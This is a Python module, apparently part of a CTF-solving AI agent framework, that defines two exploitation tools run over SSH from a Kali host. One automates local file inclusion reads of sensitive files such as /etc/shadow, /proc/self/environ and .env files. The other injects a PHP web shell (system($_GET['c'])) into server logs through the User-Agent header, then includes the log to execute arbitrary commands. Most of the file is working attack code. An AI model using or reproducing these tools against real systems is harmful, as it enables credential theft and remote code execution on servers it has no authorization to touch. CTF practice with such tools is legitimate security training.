"""LFI 利用辅助工具集.

封装常见 LFI 利用路径, 一步尝试多个目标, 返回成功读取的结果.
避免 agent 逐路径手动测试浪费步数 (NSSCTF 轨迹复盘).

工具列表:
- LfiScannerTool: 自动尝试常见 LFI 路径 (/etc/passwd, 日志, 配置等)
- LfiLogInjectTool: 日志包含 RCE — 注入恶意 UA + 包含日志
"""
from __future__ import annotations

from typing import Any

from ctf_agent.ssh import SSHClient
from ctf_agent.tools.base import Tool

_MAX_OUTPUT = 8000

# 常见 LFI 目标路径 (按优先级)
_COMMON_PATHS = [
    "/etc/passwd",
    "/etc/shadow",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/etc/hostname",
    "/etc/hosts",
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "/var/lib/php/sessions/",
    "/tmp/sess_",
    "/app/.env",
    "/var/www/html/.env",
    "/proc/self/status",
    "/etc/apache2/apache2.conf",
    "/etc/apache2/sites-enabled/000-default.conf",
    "/etc/nginx/nginx.conf",
    "/etc/nginx/sites-enabled/default",
]


def _truncate(text: str, max_len: int = _MAX_OUTPUT) -> str:
    if len(text) <= max_len:
        return text
    return text[:max_len] + f"\n... (截断, 共 {len(text)} 字符)"


class LfiScannerTool(Tool):
    """LFI 扫描器: 自动尝试常见路径, 返回成功读取的结果.

    用法: 提供 URL 模板 (用 {FILE} 占位) + 可选的自定义路径列表.
    工具会在 Kali 上用 curl 逐个尝试, 返回有内容的结果.
    """

    name = "lfi_scanner"
    description = (
        "LFI 扫描: 自动尝试常见路径 (/etc/passwd, 日志, 配置, /proc 等), "
        "返回成功读取的内容. 输入 URL 模板 (用 {FILE} 占位 LFI 路径). "
        "适用于已确认 LFI 漏洞后快速读取敏感文件."
    )
    parameters = {
        "type": "object",
        "properties": {
            "url_template": {
                "type": "string",
                "description": "URL 模板, 用 {FILE} 占位 LFI 目标路径. "
                               "例: http://target/index.php?file={FILE}",
            },
            "extra_paths": {
                "type": "string",
                "description": "额外尝试的路径, 逗号分隔. 例: /app/flag,/app/config.php",
            },
            "timeout": {
                "type": "integer",
                "description": "每个请求超时秒数 (默认 10)",
            },
        },
        "required": ["url_template"],
    }

    def __init__(self, ssh_client: SSHClient) -> None:
        self.ssh_client = ssh_client

    def execute(self, url_template: str, extra_paths: str = "", timeout: int = 10, **_: Any) -> str:
        # 构建路径列表
        paths = list(_COMMON_PATHS)
        if extra_paths:
            paths.extend(p.strip() for p in extra_paths.split(",") if p.strip())

        # 检查 URL 模板
        if "{FILE}" not in url_template:
            return "ERROR: url_template 必须包含 {FILE} 占位符. 例: http://target/index.php?file={FILE}"

        results: list[str] = []
        tried = 0
        for path in paths:
            url = url_template.replace("{FILE}", path)
            # 用 curl -s -o - 获取内容, --max-time 控制超时
            # -g 禁止 glob (处理 URL 中的 [] 字符)
            cmd = (
                f"curl -s -g --max-time {timeout} -o - '{url}' 2>/dev/null | "
                f"head -c 2000"
            )
            result = self.ssh_client.exec_cmd(cmd, timeout=timeout + 5)
            output = (result.stdout or "").strip()
            tried += 1

            # 过滤空响应和明显错误
            if output and len(output) > 5 and "not found" not in output.lower()[:50]:
                # 检查是否看起来像有效内容 (不是错误页面)
                results.append(f"[{path}] ({len(output)} bytes):\n{output[:500]}")

            if tried >= 25:  # 限制最多尝试 25 个路径
                break

        if not results:
            return f"扫描 {tried} 个路径, 均无有效内容. 可能 LFI 不可用或路径不对."

        header = f"LFI 扫描完成: {len(results)}/{tried} 个路径有内容\n"
        return _truncate(header + "\n---\n".join(results))


class LfiLogInjectTool(Tool):
    """日志包含 RCE: 注入恶意 UA 到日志 + 包含日志执行.

    两步合一:
    1. 发请求注入 PHP 代码到 User-Agent
    2. 通过 LFI 包含日志文件, 传入命令参数执行
    """

    name = "lfi_log_inject"
    description = (
        "日志包含 RCE: 自动注入恶意 UA + 通过 LFI 包含日志执行命令. "
        "输入: lfi_url (LFI 包含点, 用 {FILE} 占位), "
        "log_path (日志路径, 如 /var/log/apache2/access.log), "
        "cmd (要执行的命令). "
        "工具会先注入 UA 再包含日志."
    )
    parameters = {
        "type": "object",
        "properties": {
            "lfi_url": {
                "type": "string",
                "description": "LFI URL 模板, {FILE} 占位. 例: http://target/index.php?file={FILE}",
            },
            "log_path": {
                "type": "string",
                "description": "日志文件路径. 默认尝试 /var/log/apache2/access.log",
            },
            "cmd": {
                "type": "string",
                "description": "要执行的 shell 命令. 默认: id",
            },
        },
        "required": ["lfi_url"],
    }

    def __init__(self, ssh_client: SSHClient) -> None:
        self.ssh_client = ssh_client

    def execute(self, lfi_url: str, log_path: str = "", cmd: str = "id", **_: Any) -> str:
        if "{FILE}" not in lfi_url:
            return "ERROR: lfi_url 必须包含 {FILE} 占位符"

        # 默认尝试多个日志路径
        log_paths = [log_path] if log_path else [
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "/var/log/apache2/error.log",
            "/var/log/nginx/error.log",
        ]

        # 注入恶意 UA
        ua_payload = f"<?php echo 'LFI_RCE_START'; system($_GET['c']); echo 'LFI_RCE_END'; ?>"
        results: list[str] = []

        for lp in log_paths:
            # Step 1: 注入恶意 UA
            inject_url = lfi_url.split("?")[0] if "?" in lfi_url else lfi_url.replace("{FILE}", "")
            inject_cmd = (
                f"curl -s -g --max-time 10 -A '{ua_payload}' '{inject_url}' > /dev/null 2>&1"
            )
            self.ssh_client.exec_cmd(inject_cmd, timeout=15)

            # Step 2: 包含日志 + 执行命令
            import urllib.parse
            encoded_cmd = urllib.parse.quote(cmd)
            exec_url = lfi_url.replace("{FILE}", lp) + f"&c={encoded_cmd}"
            # 如果 URL 没有 ? 参数, 用 ? 而不是 &
            if "?" not in lfi_url:
                exec_url = lfi_url.replace("{FILE}", lp) + f"?c={encoded_cmd}"

            exec_cmd = f"curl -s -g --max-time 10 '{exec_url}' 2>/dev/null | head -c 3000"
            result = self.ssh_client.exec_cmd(exec_cmd, timeout=15)
            output = (result.stdout or "").strip()

            if "LFI_RCE_START" in output:
                # 提取 START 和 END 之间的内容
                start_idx = output.find("LFI_RCE_START") + len("LFI_RCE_START")
                end_idx = output.find("LFI_RCE_END", start_idx)
                if end_idx > start_idx:
                    rce_output = output[start_idx:end_idx].strip()
                    results.append(f"[{lp}] RCE 成功!\n命令: {cmd}\n输出:\n{rce_output}")
                else:
                    results.append(f"[{lp}] RCE 标记匹配但未提取到输出 (可能命令无回显):\n{output[:500]}")
            elif output:
                results.append(f"[{lp}] 有内容但无 RCE 标记 (日志可能不可读或注入失败):\n{output[:300]}")

        if not results:
            return "日志包含 RCE 失败: 所有日志路径均不可读或注入未生效."

        return _truncate("\n---\n".join(results))


def lfi_tools(ssh_client: SSHClient) -> list[Tool]:
    """返回 LFI 辅助工具集."""
    return [LfiScannerTool(ssh_client), LfiLogInjectTool(ssh_client)]
